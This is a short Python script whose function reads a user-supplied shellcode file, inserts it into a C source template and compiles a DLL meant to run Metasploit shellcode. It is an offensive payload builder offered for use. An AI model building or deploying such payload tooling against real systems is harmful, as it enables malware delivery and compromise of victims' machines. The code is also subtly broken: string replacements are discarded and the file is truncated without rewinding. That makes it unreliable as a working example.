import subprocess
import os

def build_msf_dll():
    """
    build dll that executes metasploit shellcode
    """
    shellcodeFile = input("[+] Enter Path to Shellcode file : ")
    try:
        with open(shellcodeFile, "r+") as readin_code:
            c_array_msf = readin_code.read()
            print("[+] Using : ")
            print(c_array_msf)

            print("[i] Writing to Source DLL file.")
            with open("payloads/msf.c", "r+") as source_file:
                source_code = source_file.read()
                source_code.replace("{{shellcodehere}}", c_array_msf)
                source_file.truncate(0)
                source_file.write(source_code)
                print("[i] Building DLL.")
                # Mingw32, to support my windows envoironment
                if(os.name == "nt"):
                    subprocess.call(["mingw32-make", "msf"])
                else:
                    subprocess.call(["make", "msf"])

                if(not os.path.isfile("msf.dll")):
                    print("[X] An Error occured when building Dll.")
                else:
                    source_code.replace(c_array_msf, "{{shellcodehere}}")
                    source_file.truncate(0)
                    source_file.write(source_code)

    except Exception as e:
        print("[X] Error : " + str(e))
